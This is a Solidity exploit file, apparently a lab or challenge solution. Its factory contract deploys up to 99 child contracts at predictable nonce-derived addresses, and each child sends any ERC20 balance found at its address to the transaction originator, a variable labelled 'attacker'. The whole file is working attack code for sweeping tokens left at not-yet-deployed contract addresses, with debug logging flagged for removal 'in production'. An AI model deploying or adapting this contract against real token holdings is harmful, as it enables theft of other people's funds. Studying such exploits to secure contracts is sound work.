// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol"; // to comment in production

contract WithdrawTokenContractFactory {
    event Nonce(uint256);

    constructor(address tokenAddress) {
        for (uint256 contractNonce = 2; contractNonce < 101; contractNonce++) {
            // the nonce of a contract is initially 1 so when deploying first contract, it becomes 2
            new WithdrawTokenContract(tokenAddress, contractNonce);
        }
    }
}

contract WithdrawTokenContract {
    constructor(address tokenAddress, uint256 contractNonce) {
        address attacker = tx.origin;
        IERC20 token = IERC20(tokenAddress);
        uint256 balanceContract = token.balanceOf(address(this));
        if (balanceContract > 0) {
            console.log(contractNonce); // shows the nonce of the successful factory, to comment in production
            token.transfer(attacker, balanceContract);
        }
    }
}
